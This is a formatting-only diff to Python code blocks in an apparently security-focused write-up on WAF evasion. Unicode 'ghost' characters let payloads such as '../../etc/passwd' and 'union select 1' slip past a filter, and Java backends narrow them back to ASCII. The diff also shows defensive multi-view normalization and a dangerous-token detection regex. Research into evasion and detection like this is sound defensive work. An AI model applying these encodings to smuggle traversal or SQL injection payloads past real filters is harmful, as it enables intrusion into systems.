@@ -227,16 +227,15 @@ def to_ghost(payload: str, charset: str = "latin") -> str:
         k = 0x96
     else:
         raise ValueError("charset must be 'latin' or 'cjk'")
-    return "".join(ghost(ord(ch), k) if ord(ch) < 0x80 else ch
-                   for ch in payload)
+    return "".join(ghost(ord(ch), k) if ord(ch) < 0x80 else ch for ch in payload)
 
 
 # usage examples
 print(to_ghost("../../etc/passwd", "cjk"))
 # -> 阮阮阯阮阮阯阱䁴ţ阯Őšųų䁴ď   (mixed because k=0x96 only spans CJK)
 
-print(ghost(0x6A, 0x96))   # 陪
-print(ghost(0x40, 0x01))   # ŀ
+print(ghost(0x6A, 0x96))  # 陪
+print(ghost(0x40, 0x01))  # ŀ
 ```
 
 ### 3.2 Python — UTF-8 byte-level wire view
@@ -256,8 +255,8 @@ def narrowed(payload: str) -> bytes:
 
 
 s = to_ghost("union select 1", "cjk")
-print(wire_bytes(s).hex())   # what the WAF sees as bytes
-print(narrowed(s))           # what Java reconstructs: b'union select 1'
+print(wire_bytes(s).hex())  # what the WAF sees as bytes
+print(narrowed(s))  # what Java reconstructs: b'union select 1'
 ```
 
 ### 3.3 Yaklang — for `poc.HTTP` and `fuzz`
@@ -342,17 +341,18 @@ backend would see. The minimal viable approach is multi-view inspection:
 ```python
 DANGEROUS_TOKENS_REGEX = compile_dangerous_tokens()  # ../, @type, etc.
 
+
 def normalize_views(buf: bytes) -> dict:
     s = buf.decode("utf-8", errors="replace")
     return {
-        "raw":           s,
-        "low_byte":      "".join(chr(ord(c) & 0xFF) for c in s),
+        "raw": s,
+        "low_byte": "".join(chr(ord(c) & 0xFF) for c in s),
         "fullwidth_nfkc": unicodedata.normalize("NFKC", s),
-        "url_decoded":   strict_url_decode(s),
-        "url_lax_hex":   lax_hex_url_decode(s),    # mimic Jetty fromHexDigit
-        "u_escape":      unescape_u_escapes(s),
-        "x_escape":      unescape_x_escapes(s),    # mimic Fastjson \x default 0
-        "base64_low":    decode_base64_low_byte(s),
+        "url_decoded": strict_url_decode(s),
+        "url_lax_hex": lax_hex_url_decode(s),  # mimic Jetty fromHexDigit
+        "u_escape": unescape_u_escapes(s),
+        "x_escape": unescape_x_escapes(s),  # mimic Fastjson \x default 0
+        "base64_low": decode_base64_low_byte(s),
     }
 
 
@@ -377,8 +377,8 @@ def lax_hex_url_decode(s: str) -> str:
         c = s[i]
         if c == "%" and i + 2 < len(s):
             try:
-                hi = jetty_lax_hex(s[i+1])
-                lo = jetty_lax_hex(s[i+2])
+                hi = jetty_lax_hex(s[i + 1])
+                lo = jetty_lax_hex(s[i + 2])
                 if 0 <= hi <= 15 and 0 <= lo <= 15:
                     out.append(chr((hi << 4) | lo))
                     i += 3
@@ -392,7 +392,7 @@ def lax_hex_url_decode(s: str) -> str:
 
 def jetty_lax_hex(c: str) -> int:
     x = (ord(c) & 0x1F) + ((ord(c) >> 6) * 25) - 16
-    return x   # 0..15 for legal digits; also returns 14 for '>'
+    return x  # 0..15 for legal digits; also returns 14 for '>'
 ```
 
 WAF rule outline (high signal, low false positive):
